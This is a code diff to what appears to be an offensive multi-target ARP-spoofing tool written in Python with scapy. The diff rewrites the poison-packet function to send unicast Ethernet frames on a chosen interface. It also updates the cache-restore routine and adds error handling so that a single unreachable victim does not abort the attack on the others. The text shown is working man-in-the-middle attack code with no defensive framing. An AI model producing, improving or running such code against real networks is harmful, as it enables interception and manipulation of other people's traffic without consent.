@@ -14,7 +14,7 @@ ALL of them at once, instead of only being able to handle one victim.
 import threading
 import time
 
-from scapy.all import ARP, send
+from scapy.all import ARP, Ether, sendp
 
 import config
 from utils.logger import log_info, log_ok, log_err
@@ -28,9 +28,16 @@ def send_fake_arp(dst_ip: str, dst_mac: str, spoofed_ip: str, interface: str):
     sent from). This is the "poison" packet: repeating it every few
     seconds overwrites the legitimate entry in the target's ARP cache
     before it can expire on its own.
+
+    Built as a full Ethernet frame (Ether/ARP) sent with `sendp()`
+    instead of the L3 `send()`: this way the packet goes out unicast,
+    addressed directly to `dst_mac` at the link layer, over the exact
+    `interface` requested — `send()` operates at L3 and picks the
+    egress interface from the routing table, silently ignoring the
+    `iface` argument and broadcasting the ARP reply instead of unicasting it.
     """
-    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=spoofed_ip)
-    send(packet, iface=interface, verbose=False)
+    frame = Ether(dst=dst_mac) / ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=spoofed_ip)
+    sendp(frame, iface=interface, verbose=False)
 
 
 def restore_arp(dst_ip: str, dst_mac: str, src_ip: str, src_mac: str, interface: str):
@@ -41,8 +48,8 @@ def restore_arp(dst_ip: str, dst_mac: str, src_ip: str, src_mac: str, interface:
     this, the poisoning would linger for several more minutes (until the
     ARP entry naturally times out).
     """
-    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
-    send(packet, iface=interface, count=5, verbose=False)
+    frame = Ether(dst=dst_mac) / ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
+    sendp(frame, iface=interface, count=5, verbose=False)
 
 
 class SpoofSession:
@@ -118,6 +125,16 @@ class SpoofManager:
         self._lock = threading.Lock()
 
     def add_target(self, target_ip: str, gateway_ip: str, interface: str) -> SpoofSession:
+        """
+        Crea y arranca una sesión de spoofing para una víctima.
+
+        `session.start()` resuelve MACs por ARP contra un host real de
+        la red — puede fallar si ese host se desconectó entre el
+        --scan y el ataque (típico en móviles con MAC aleatoria, que
+        además pueden apagar el WiFi). Se captura la excepción aquí
+        para que UN host inalcanzable no aborte todo el ataque
+        multi-objetivo: se avisa y se sigue con el resto de víctimas.
+        """
         with self._lock:
             if len(self.sessions) >= config.MAX_THREADS:
                 log_err(
@@ -126,7 +143,11 @@ class SpoofManager:
                 )
                 return None
         session = SpoofSession(target_ip, gateway_ip, interface)
-        session.start()
+        try:
+            session.start()
+        except Exception as e:
+            log_err(f"[{target_ip}] Could not start spoofing session, skipping: {e}")
+            return None
         with self._lock:
             self.sessions.append(session)
         return session
